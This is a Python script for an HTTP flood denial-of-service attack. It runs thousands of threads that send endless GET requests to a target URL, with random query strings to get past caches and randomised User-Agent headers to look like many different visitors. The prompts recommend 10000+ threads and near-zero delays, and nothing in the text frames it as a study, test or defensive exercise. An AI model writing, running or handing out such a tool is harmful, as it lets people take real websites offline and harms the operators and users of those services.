import threading
import requests
import random
import string
import time

def generate_random_data():
    """Generate random data to append to the URL to create unique requests."""
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(20))

def generate_dynamic_user_agent():
    """Generate a random User-Agent string to simulate various browsers and devices."""
    browsers = ["Chrome", "Firefox", "Safari", "Edge", "Opera"]
    versions = ["91.0", "92.0", "93.0", "94.0", "95.0"]
    os_systems = ["Windows NT 10.0", "Macintosh; Intel Mac OS X 10.15", "X11; Linux x86_64", "Android 11"]
    browser = random.choice(browsers)
    version = random.choice(versions)
    os_system = random.choice(os_systems)
    return f"Mozilla/5.0 ({os_system}; {browser} {version}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version} Safari/537.36"

def attack(url):
    """Perform HTTP/HTTPS GET requests to flood the target URL."""
    while True:
        try:
            full_url = f"{url}?{generate_random_data()}"
            headers = {"User-Agent": generate_dynamic_user_agent()}
            response = requests.get(full_url, headers=headers)
            print(f"Attacked {full_url} with response code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Error: {e}")
            time.sleep(1)  # Wait for a second before retrying

def main():
    """Main function to set up the attack."""
    url = input("Enter the target URL (include http:// or https://): ")
    num_threads = int(input("Enter the number of threads (suggest 10000+): "))
    delay_input = input("Enter the delay between requests in seconds (suggest 0.001 or less): ")
    delay = float(delay_input) if delay_input else 0.001

    threads = []

    for i in range(num_threads):
        thread = threading.Thread(target=attack, args=(url,))
        thread.daemon = True
        threads.append(thread)
        time.sleep(delay)

    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
